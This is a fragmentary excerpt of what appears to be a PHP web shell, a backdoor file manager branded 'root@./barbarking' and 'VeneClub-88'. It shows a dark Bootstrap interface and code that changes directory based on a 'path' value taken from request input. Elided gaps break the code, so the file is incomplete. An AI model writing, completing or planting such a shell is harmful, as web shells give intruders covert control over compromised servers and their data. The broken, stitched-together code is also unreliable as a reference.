...
<html>
	<head>
		...
		<link rel="icon" href="https://www.graphis.com/media/uploads/cache/d5/47/d5471f3870717c465329499e49b542c4.jpg">
	</head>
<body class="bg-dark">
<form method="POST">
...
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			<a class='text-decoration-none text-light anu' href='".$_SERVER['PHP_SELF']."'><h4>root@./barbarking</h4></a>";
			if(isset($_7['path'])){
				$path = $_7['path'];
				chdir($path);
			}else{
		...
		<div class='container-fluid'>
			<div class='corner anu py-3'>
				<button class='btn btn-outline-light btn-sm' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'><i class='bi bi-info-circle'></i> info <i class='bi bi-chevron-down'></i></button></div>
		...
		</div><div class='text-secondary'>&copy; 2022-<?=date('Y');?> VeneClub-88</div>
	</div>
</div>
</body>
</html>
